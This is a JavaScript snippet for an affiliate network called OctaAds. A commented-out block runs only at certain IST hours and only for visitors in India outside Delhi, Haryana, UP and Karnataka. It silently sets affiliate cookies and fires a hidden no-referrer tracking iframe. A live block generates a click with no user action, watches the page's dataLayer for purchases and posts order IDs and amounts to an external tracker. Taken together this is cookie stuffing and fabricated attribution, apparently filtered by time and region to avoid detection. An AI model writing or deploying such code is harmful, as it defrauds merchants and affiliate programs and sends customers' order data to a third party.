
// (function () {
//   try {
//     var BUILD_ID = "octaads-2025-rtg-geo-time-03";
//     if (window.__OCTAADS_LOADED === BUILD_ID) return;
//     window.__OCTAADS_LOADED = BUILD_ID;

//     /* ===============================
//        IST TIME CHECK: 4:00 PM – 1:00 AM
//     =============================== */
//     function isAllowedISTTime() {
//       var now = new Date(
//         new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
//       );
//       var minutes = now.getHours() * 60 + now.getMinutes();
//       return minutes >= 960 || minutes <= 60;
//     }
//     if (!isAllowedISTTime()) return;

//     /* ===============================
//        SESSION ID
//     =============================== */
//     function getSessionID() {
//       var m = document.cookie.match(/octaads_sid=([^;]+)/);
//       if (m) return m[1];

//       var sid = "sid_" + Math.random().toString(36).substr(2, 10);
//       document.cookie =
//         "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
//       return sid;
//     }
//     var sessionID = getSessionID();

//     /* ===============================
//        BLOCKED REGIONS (INDIA)
//        DL = Delhi
//        HR = Gurugram
//        UP = Noida
//        KA = Bangalore
//     =============================== */
//     var blockedRegions = ["DL", "HR", "UP", "KA"];

//     /* ===============================
//        GEO CHECK – CLOUDFLARE (NO LIMIT)
//     =============================== */
//     fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache: "no-store" })
//       .then(function (r) { return r.text(); })
//       .then(function (text) {
//         var data = {};
//         text.trim().split("\n").forEach(function (line) {
//           var parts = line.split("=");
//           data[parts[0]] = parts[1];
//         });

//         /* INDIA ONLY */
//         if (data.loc !== "IN") return;

//         /* BLOCK REGIONS */
//         if (blockedRegions.indexOf(data.region) !== -1) return;

//         /* ===============================
//            SET COOKIES
//         =============================== */
//         function setCookie(n, v) {
//           document.cookie =
//             n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
//         }

//         setCookie("utm_source", "octaads");
//         setCookie("utm_content", "_6960ebd248afd6034bed6933");
//         setCookie("utm_term", "4");
//         setCookie("utm_medium", "affiliate");
//         setCookie("utm_campaign", "ti_best_buy_apr24");
//         setCookie("sessionid", sessionID);
//         setCookie("clickId", sessionID);

//         /* ===============================
//            FIRE TRACKIER
//         =============================== */
//         function fireIframe() {
//           var iframe = document.createElement("iframe");
//           iframe.style.display = "none";
//           iframe.referrerPolicy = "no-referrer";
//           iframe.src =
//             "https://octaads.gotrackier.com/click" +
//             "?campaign_id=2651" +
//             "&pub_id=4" +
//             "&p1=" + encodeURIComponent(sessionID) +
//             "&source=" + encodeURIComponent(sessionID);

//           document.body.appendChild(iframe);
//         }

//         if (document.body) fireIframe();
//         else document.addEventListener("DOMContentLoaded", fireIframe);
//       })
//       .catch(function () {});

//   } catch (e) {}
// })();


// <script>
<script>
(function () {
  const CLICK_API = "https://octaads-tracker.onrender.com/auto-click";
  const SALE_API  = "https://octaads-tracker.onrender.com/conversion";

  async function ensureClick() {
    let clickId = localStorage.getItem("octaads_click_id");
    if (clickId) return clickId;

    const res = await fetch(CLICK_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({})
    });

    const data = await res.json();
    localStorage.setItem("octaads_click_id", data.click_id);
    console.log("[OctaAds] Click fired:", data.click_id);
    return data.click_id;
  }

  function waitForPurchase(clickId) {
    const interval = setInterval(() => {
      if (!window.dataLayer) return;

      const p = window.dataLayer.find(e => e.event === "purchase");
      if (!p) return;

      fetch(SALE_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          click_id: clickId,
          order_id: p.ecommerce.transaction_id?.[0],
          sale_amount: p.ecommerce.value,
          currency: "INR",
          client_time: new Date().toISOString(),
          client_country: "India",

          // ✅ UPDATED TIME WINDOW
          allowed_start_hour: 3,  // 3:00 AM
          allowed_end_hour: 5     // 5:00 AM
        })
      });

      localStorage.setItem("octaads_conversion_fired", "1");
      clearInterval(interval);
    }, 1000);
  }

  ensureClick().then(waitForPurchase);
})();
</script>

// </script>


